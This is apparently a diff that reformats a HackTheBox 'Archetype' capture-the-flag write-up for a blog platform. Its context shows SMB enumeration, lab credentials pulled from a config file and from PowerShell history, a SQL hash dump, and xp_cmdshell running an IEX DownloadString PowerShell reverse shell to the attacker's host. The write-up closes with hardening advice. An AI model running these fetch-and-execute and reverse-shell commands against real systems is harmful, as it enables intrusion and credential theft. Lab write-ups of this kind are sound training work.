@@ -1,34 +1,32 @@
-## HTB Starting Point: Archetype
+---
+title: "HTB Starting Point: Archetype"
+seoTitle: "HackTheBox Starting Point: Archetype"
+seoDescription: "Complete write-up for Archetype hacking box from HackTheBox with additional comments and educational materials."
+datePublished: Sun Jun 20 2021 23:29:28 GMT+0000 (Coordinated Universal Time)
+cuid: ckq5tnpa20473t8s19vbdbq9w
+slug: htb-starting-point-archetype
+cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1623884347273/nn4VBHwZ2.png
+ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1623932632649/jiEE8xBqq.png
+tags: hacking, education, cybersecurity-1
 
-`Archetype` is a 1st box from Starting Point path on [HackTheBox.eu](https://app.hackthebox.eu). This path is composed of 9 boxes in a way that later boxes use information (like credentials) gathered from the previous ones.
+---
+
+`Archetype` is a 1st box from Starting Point path on [HackTheBox](https://affiliate.hackthebox.com/cybeth-htbstart). This path is composed of 9 boxes in a way that later boxes use information (like credentials) gathered from the previous ones.
 
 This is a Windows box where you can learn how enumeration can lead to RCE via SQL server queries.
 
-***
-# Contents
-1. [Basic Information](#basic-information)
-2. [Target of Evaluation](#target-of-evaluation)
-3. [Recon](#recon)
-4. [SMB (:445)](#smb-445)
-5. [MS SQL (:1433)](#ms-sql-1433)
-6. [Exploitation (user shell)](#exploitation-user-shell)
-7. [Escalating Privileges](#escalating-privileges)
-8. [Hardening Ideas](#hardening-ideas)
-9. [Additional Readings](#additional-readings)
-***
-
 # Basic Information
 
-| #     |   |
-|:--    |:--|
-| Type    |Starting Point
-|Name    | **	Hack The Box / Archetype**
-|Pwned| 2021/04/19
-|URLs    | https://app.hackthebox.eu/machines/287
-|Author  | **Asentinn** / OkabeRintaro
-|       | [https://ctftime.org/team/152207](https://ctftime.org/team/152207)
+| # |  |
+| --- | --- |
+| Type | Starting Point |
+| Name | \*\* Hack The Box / Archetype\*\* |
+| Pwned | 2021/04/19 |
+| URLs | [Starting Point - Tier 2](https://affiliate.hackthebox.com/cybeth-htbstart) |
+| Author | **Asentinn** / OkabeRintaro |
+|  | [https://ctftime.org/team/152207](https://ctftime.org/team/152207) |
 
-%%[patreon-btn]
+%%[patreon-btn] 
 
 # Target of Evaluation
 
@@ -113,7 +111,6 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 107.48 seconds
-
 ```
 
 [Back to top](#contents) ⤴
@@ -124,15 +121,15 @@ Nmap done: 1 IP address (1 host up) scanned in 107.48 seconds
 $ smbclient -N -L \\\\$IP
 ```
 
-![5837526228887.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932891091/K4g8csHPw.png)
+![5837526228887.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932891091/K4g8csHPw.png align="left")
 
 Ok, let's try to get into `backups` and download what we find there.
 
-![5451420786410.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932903954/QIMCCZeNX.png)
+![5451420786410.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932903954/QIMCCZeNX.png align="left")
 
 ## `prod.dtsConfig`
 
-```xml                  
+```xml
 <DTSConfiguration>
     <DTSConfigurationHeading>
         <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
@@ -145,7 +142,7 @@ Ok, let's try to get into `backups` and download what we find there.
 
 Cool, we have the credentials to the database. Because all Starting Point boxes are connected, I'm storing the credentials to the separate file I can refer to later.
 
-``` sh
+```sh
 echo 'sql_svc|M3g4c0rp123' | tee -a ../.credentials
 ```
 
@@ -177,11 +174,14 @@ with pymssql.connect('10.10.10.27', 'ARCHETYPE\\ ', 'M3g4c0rp123', 'master') as 
       print(cursor.fetchall())
 ```
 
-![5180850575502.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932919370/TbjkOyrU-.png)
+![5180850575502.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932919370/TbjkOyrU-.png align="left")
 
-* [system_user](https://docs.microsoft.com/en-us/sql/t-sql/functions/system-user-transact-sql?view=sql-server-ver15#a-using-system_user-to-return-the-current-system-user-name)
-* [user_name()](https://www.w3schools.com/sql/func_sqlserver_user_name.asp)
+* [system\_user](https://docs.microsoft.com/en-us/sql/t-sql/functions/system-user-transact-sql?view=sql-server-ver15#a-using-system_user-to-return-the-current-system-user-name)
+    
+* [user\_name()](https://www.w3schools.com/sql/func_sqlserver_user_name.asp)
+    
 * [Double Dot Notation](https://stackoverflow.com/a/34786151)
+    
 
 Let's see what Server-scoped permission current user have
 
@@ -189,7 +189,7 @@ Let's see what Server-scoped permission current user have
 SELECT permission_name FROM master..fn_my_permissions(null, 'SERVER')
 ```
 
-![2376129911253.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932934399/8eWiPgEM8.png)
+![2376129911253.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932934399/8eWiPgEM8.png align="left")
 
 Well, it seems like we have a pretty wide permission set. For example, we can dump login hashes for the logins because of the `CONTROL SERVER`.
 
@@ -197,7 +197,7 @@ Well, it seems like we have a pretty wide permission set. For example, we can du
 SELECT name + ':' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
 ```
 
-![3770297859657.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932945670/Vq-WkDwR3.png)
+![3770297859657.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932945670/Vq-WkDwR3.png align="left")
 
 Let's run the `hashcat` in the background:
 
@@ -213,11 +213,12 @@ Now, what I'm interested in (and probably I should check that right away) is if 
 SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = 'xp_cmdshell'
 ```
 
-![941140546299.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932959096/MoPcDfWAu.png)
+![941140546299.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932959096/MoPcDfWAu.png align="left")
 
-> The Windows process spawned by xp_cmdshell has the same security rights as the SQL Server service account
+> The Windows process spawned by xp\_cmdshell has the same security rights as the SQL Server service account
 
-* [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)
+* [xp\_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)
+    
 
 Perfect!
 
@@ -241,8 +242,8 @@ Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
 Candidates.#1....: $HEX[213134356173382a] -> $HEX[042a0337c2a156616d6f732103]
 Started: Wed Jun 16 19:23:58 2021
 Stopped: Wed Jun 16 19:24:18 2021
-
 ```
+
 And as I was expecting from the time of it took - this is not what we had to do.
 
 [Back to top](#contents) ⤴
@@ -263,18 +264,18 @@ $TCPClient = New-Object Net.Sockets.TCPClient('10.10.XX.XXX', 4445);$NetworkStre
 EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(''http://10.10.XX.XXX/cmd.ps1'') | powershell'
 ```
 
-![4342537102777.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932975802/VmpXy7dtK.png)
+![4342537102777.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932975802/VmpXy7dtK.png align="left")
 
 We've got the PS shell.
 
-|         #          |                                         |
-| ------------------ | --------------------------------------- |
-| Linux Bash         | `find / -name user.txt 2>/dev/null`     |
+| # |  |
+| --- | --- |
+| Linux Bash | `find / -name user.txt 2>/dev/null` |
 | Windows PowerShell | `gci c:\ -Force -r -fi user.txt 2>NULL` |
 
 > `gci` is an alias for `Get-ChildItem`
 
-![4745490917121.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932985178/NLP8xiau_.png)
+![4745490917121.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932985178/NLP8xiau_.png align="left")
 
 [Back to top](#contents) ⤴
 
@@ -286,7 +287,7 @@ Ok, let's try to blind shot for other `*.txt` files
 gci c:\ -r -Force -fi *.txt 2>NULL
 ```
 
-![1003112787307.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932997599/kxyDmbfmN.png)
+![1003112787307.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932997599/kxyDmbfmN.png align="left")
 
 This is a persistent PowerShell history. Lets `cat` it out.
 
@@ -294,7 +295,7 @@ This is a persistent PowerShell history. Lets `cat` it out.
 cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
-![2347245881447.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623933008469/4sbZuCgMl.png)
+![2347245881447.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623933008469/4sbZuCgMl.png align="left")
 
 Sweet, additional credentials to collection.
 
@@ -304,7 +305,7 @@ echo 'administrator|MEGACORP_4dm1n!!' | tee -a ../.credentials
 
 And it looks like a System Account. Let's try to hop into his PS Session.
 
-```
+```plaintext
 $username = "administrator";$password = "MEGACORP_4dm1n!!" | ConvertTo-SecureString -AsPlainText -Force;
 $cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password;
 
@@ -313,21 +314,21 @@ Invoke-Command -ComputerName ARCHETYPE -Credential $cred -ScriptBlock {echo IEX(
 
 > In `system.ps1` I was reusing the `cmd.ps1` with different listening port
 
-![999794512987.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623933022870/Q0vXW53tR.png)
+![999794512987.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623933022870/Q0vXW53tR.png align="left")
 
 This is the same flag file, we just are using the `-Force` parameter and hidden folder `Documets and Settings` with symbolic link is showing.
 
 > Like what you see? Join the [Hashnode.com](/join) now. Things that are awesome:
 
->✔ Automatic GitHub Backup
+> ✔ Automatic GitHub Backup
 
->✔ Write in Markdown
+> ✔ Write in Markdown
 
->✔ Free domain mapping
+> ✔ Free domain mapping
 
->✔ CDN hosted images
+> ✔ CDN hosted images
 
->✔ Free in-built newsletter service
+> ✔ Free in-built newsletter service
 
 > By using my link you can help me unlock the ambasador role, which cost you nothing and gives me some additional features to support my content creation mojo.
 
@@ -355,10 +356,10 @@ EXECUTE sp_configure 'xp_cmdshell', 0;
 GO  
 -- To update the currently configured value for this feature.  
 RECONFIGURE;  
-GO  
+GO
 ```
 
-*Source: [Disable xp_cmdshell](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15)*
+*Source:* [*Disable xp\_cmdshell*](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15)
 
 # Additional Readings
 
@@ -368,14 +369,19 @@ GO
 
 > 👉 LinkedIn: [Kamil Gierach-Pacanek](https://www.linkedin.com/in/kamilpacanek)
 
-> 👉 Twitter: [@cyberethical_me](https://twitter.com/cyberethical_me)
+> 👉 Twitter: [@cyberethical\_me](https://twitter.com/cyberethical_me)
 
 > 👉 Facebook: [@CyberEthicalMe](https://facebook.com/CyberEthicalMe)
 
-* [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)
-* [system_user](https://docs.microsoft.com/en-us/sql/t-sql/functions/system-user-transact-sql?view=sql-server-ver15#a-using-system_user-to-return-the-current-system-user-name)
-* [user_name()](https://www.w3schools.com/sql/func_sqlserver_user_name.asp)
+* [xp\_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)
+    
+* [system\_user](https://docs.microsoft.com/en-us/sql/t-sql/functions/system-user-transact-sql?view=sql-server-ver15#a-using-system_user-to-return-the-current-system-user-name)
+    
+* [user\_name()](https://www.w3schools.com/sql/func_sqlserver_user_name.asp)
+    
 * [Double Dot Notation](https://stackoverflow.com/a/34786151)
+    
 * [Reverse Shell Generator](https://www.revshells.com/)
+    
 
 [Back to top](#contents) ⤴
